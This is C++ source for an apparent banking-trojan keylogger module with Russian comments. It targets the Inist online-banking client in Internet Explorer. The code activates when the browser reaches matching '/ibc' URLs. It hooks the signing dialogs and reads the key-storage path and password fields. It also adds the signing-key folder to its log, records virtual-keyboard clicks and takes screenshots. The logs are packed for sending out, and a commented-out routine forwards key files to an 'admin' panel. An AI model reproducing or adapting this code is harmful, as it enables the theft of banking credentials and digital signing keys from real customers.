#include "GetApi.h"
#include "Strings.h"
#include "Memory.h"
#include "KeyLogSystems.h"
#include "FileGrabber.h"
#include "Utils.h"
#include "WndUtils.h"
#include "Unhook.h"
#include "BotClasses.h"

#include "BotDebug.h"

namespace DBGINISTWEB
{
	#include "DbgTemplates.h"
}

#define DBGINIST DBGINISTWEB::DBGOutMessage<>

#define InistWebModule //говорим что модуль включен

namespace InistWeb
{
	char InistSystemName[] = "inist";
	PKlgWndFilter filterAll = 0; //фильтр который кейлогит все события

	PCHAR InistCaptions[] = {
		"*егистрация пользователя*",
		"Подпись данных",
		"Подпись и шифрование",
		NULL};

	char ClassNameComboBox[] = "Combobox";
	char ClassNameEdit[] = "Edit";


 /*	PList hashKeys = 0; //список ключей которые уже сохранили
	CRITICAL_SECTION csHashKeys;

	//true - если файл является файлом ключем, а также отсылает его в админку
	int IsFileKey( FileGrabber::ParamEvent* e )
	{
		if( e->data )
		{
			char c = ((char*)e->data)[0];
			if( c >= '0' && c <= '9' )
			{
				//смотрим добавляли ли уже найденный ключ
				DWORD hashFile =  STR::GetHash( e->fileName, 0, false );
				bool exists = true;
				pEnterCriticalSection(&csHashKeys);
				if( List::IndexOf( hashKeys, (LPVOID)hashFile ) < 0 )
				{
					List::Add( hashKeys, (LPVOID)hashFile );
					exists = false;
				}
				pLeaveCriticalSection(&csHashKeys);
				if( !exists )
				{
					m_lstrcpy( e->nameSend, "keys" );
					return FileGrabber::SENDFOLDER;
				}
			}
		}
		return 0;
	}
	*/

//	void Activeted(LPVOID Sender)
//	{
//		DBGINIST( "Inist", "Activeted" );
//
//		hashKeys = List::Create();
//		pInitializeCriticalSection(&csHashKeys);
//
//		FileGrabber::Init(FileGrabber::CREATEFILEA);
//		FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
//		rv->FuncReceiver = IsFileKey;
//		rv->minSize = 100;
//		rv->maxSize = 3000;
//		rv->maska = "*BEGIN*END*";
//		FileGrabber::AddReceiver(rv);
//	}

	void Deactiveted(LPVOID Sender)
	{
		DBGINIST( "Inist", "Deactiveted" );
		PKeyLogSystem S = (PKeyLogSystem)Sender;
		List::Remove( S->Filters, filterAll );
		filterAll = 0;
//		FileGrabber::Release();
	}


	void WINAPI InistURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
	{
		// Сменился активный адрес браузера
		char Mask[] = "https://*/ibc";
		PCHAR URL = (PCHAR)Data;

		bool IsInist = CompareUrl(Mask, URL);
		if (IsInist)
		{
        	// Активируем систему
			PKeyLogSystem S = KeyLogger::SystemByName(InistSystemName);
			if (S != NULL)
				KeyLogger::ActivateSystem(S);
		}

    }
	//------------------------------------------------------------------------

	bool MakeLog(HWND ParentWnd)
	{
		// Формируем лог
		if (ParentWnd == NULL)
			return false;

		// Определяем редактор ввода директории

		HWND PathWnd = (HWND)pFindWindowExA(ParentWnd, 0, ClassNameComboBox, 0 );;


		// Ище второй комбобокс или первый едит
		if (PathWnd != NULL)
			PathWnd = (HWND)pFindWindowExA(ParentWnd, PathWnd, ClassNameComboBox, 0 );
		else
			PathWnd = (HWND)pFindWindowExA(ParentWnd, 0, ClassNameEdit, 0 );

		//Ище окно ввода пароля
		HWND PassWnd = (HWND)pFindWindowExA(ParentWnd, PathWnd, ClassNameEdit, 0 );


		if (PathWnd == NULL || PassWnd == NULL)
			return false;

		// Добавляем директорию
		PCHAR Path = NULL;
		DWORD Len = (DWORD)pSendMessageA(PathWnd, WM_GETTEXTLENGTH, 0, 0);
		if (Len != 0)
		{
			Path = STR::Alloc(Len + 1);
			pSendMessageA(PathWnd, WM_GETTEXT, Len, (LPARAM)Path);

			trimall( Path, (char)0xA0 );
			PCHAR End = STR::End(Path);
			End--;
			if (*End != '\\')
				StrConcat(Path, "\\");
		}

		DBGINIST( "Inist", "Проверяем хранилище ключей %s", Path);

		// Проверяем правильность папки
		bool Valid = (DWORD)pGetFileAttributesA(Path) != INVALID_FILE_ATTRIBUTES;
		if (Valid)
		{
        	// ОГраничиваем аксимальный разер данных
			DWORD FolderSize = 0;
			Valid = SizeFolderLess(Path, 1024*1024*5, &FolderSize);
		}

		if (Valid)
			DBGINIST( "Inist", "Хранилище успешно прошло проверку" );
		else
        	DBGINIST( "Inist", "Хранилище ключей отсутствует либо слишком большое" );

		if (Valid)
		{
			KeyLogger::AddDirectory(Path, "Keys");
		}

		STR::Free(Path);

		PKeyLogger L = KeyLogger::GetKeyLogger();
		if (L != NULL)
		{
			PCHAR S = KLGPacker::GetTextDataFromFile(L->FileName, PassWnd);

			PCHAR LB = "\r\n";
			PCHAR Pass = "Password: ";

			PCHAR Buf = STR::New(5, LB, LB, Pass, S, LB);

			KeyLogger::AddStrToBuffer((HWND)L, Buf, 0);

			STR::Free(S);
			STR::Free(Buf);
		}

		//KeyLogger::StopLogging();
		return true;
	}

  	//------------------------------------------------------------------------

	// Функия обработки сообщения
	void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
	{

		if (Msg->message == WM_LBUTTONUP)
		{
			// Отлавливаем нажатие пользователя на кнопке Ok
			DWORD ID = (DWORD)pGetWindowLongPtrA(Msg->hwnd, GWL_ID);
			if (ID == 1)
			{
				// Нажата кнопка "Ok"

				HWND Parent = (HWND)pGetParent(Msg->hwnd);
				if (!KeyLogger::IsWindowDialog(Parent)) return;

				// В данном случае возможно два варианта - нажата кнопка Ok
				// На главном диалоге, либо нажата кнопка Ввод на диалоге
				// ввода виртуальной клавиатуры
				// По этому проверяем какой диалог был инициатором сообщения
				// Если это диалог виртуальной клавиатуры, то определяем
				// основной диалог

				PKeyLogSystem S = KeyLogger::SystemByName(InistSystemName);
				if (S == NULL) return;

				PKlgWndFilter F = (PKlgWndFilter)List::GetItem(S->Filters, 0);
				if (F->DialogWnd != Parent)
				{
					// Это нажатие на виртуальной клавиатуре
					// Ищем, основной диалог
					for (DWORD i = 0; InistCaptions[i] != NULL; i++ )
					{
						Parent = (HWND)pFindWindowA(NULL, InistCaptions[i]);
						if (Parent != NULL )
							break;
					}
					if (Parent == NULL) return;

                   	F->Activated = true;
                }

				MakeLog(Parent);

				if (filterAll == NULL)
				{
					filterAll = KeyLogger::AddFilter(S, false, true, "*", "*", FILTRATE_PARENT_WND, LOG_KEYBOARD, 3);
					if( filterAll )
					{
						filterAll->LogClicks = true;
					}
                }
			}
        }
	}

	void OnGetLogWnd(LPVOID Sender, HWND &LogWnd)
	{
		TKlgWndFilter* filter = (TKlgWndFilter*)Sender;
		//ищет контрол ввода пароля
		HWND parent = (HWND)pGetParent(filter->DialogWnd);
		HWND PassWnd = (HWND)pFindWindowExA( parent, 0, "EDIT", 0 );
		LogWnd = (HWND)pFindWindowExA( parent, PassWnd, "EDIT", 0 );
		if( LogWnd == 0 ) LogWnd = PassWnd;
	}

	//------------------------------------------------------------------------
	void Init()
	{

		PKeyLogSystem S = KeyLogger::AddSystem(InistSystemName, PROCESS_HASH_IE);
		if( S != NULL )
		{
			S->SendLogAsCAB = true;
			S->TimeMode    = KLG_TIME_MIN;
			#ifdef DEBUGCONFIG
				S->TimeValue   = 1*60;
			#else
				S->TimeValue   = 5*60; // Система будет работать не мение 5-ти минут
			#endif
			S->MakeScreenShot = true;
			S->OnMessage = OnMessage;
//			S->OnActivate = Activeted;
			S->OnDeactivate = Deactiveted;

			//первый символ P в Caption может быть латинским или русским
			char KeyboardCaption[] = {'*','в','и','р','т','у','а','л','ь','н','*','к','л','а','в','и','а','т','у','р','*', 0};
            char ClassName[] = "#*";

			PKlgWndFilter F1 = KeyLogger::AddFilter(S, true, true, NULL, InistCaptions[0], FILTRATE_PARENT_WND, LOG_ALL, 3);

			if (F1 != NULL)
			{
				F1->DontSaveMouseLog = true;

				KeyLogger::AddFilterText(F1, NULL, InistCaptions[1]);
				KeyLogger::AddFilterText(F1, NULL, InistCaptions[2]);

                // Добавляем фильтр виртуальной клавиатуры
				PKlgWndFilter F2 = KeyLogger::AddFilter(S, true, false, ClassName, KeyboardCaption, FILTRATE_PARENT_WND, LOG_MOUSE, 3);
				if (F2 != NULL)
				{
                    F2->MouseLogWnd = MOUSE_LOG_WND_FILTER;
					F2->PreFilter = F1;
					F2->OnGetLogWnd = OnGetLogWnd;
                }

			}

		}

		//Устанавливаем событие на смену урла в ИЕ
		KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, InistURLChanged);

	}
}
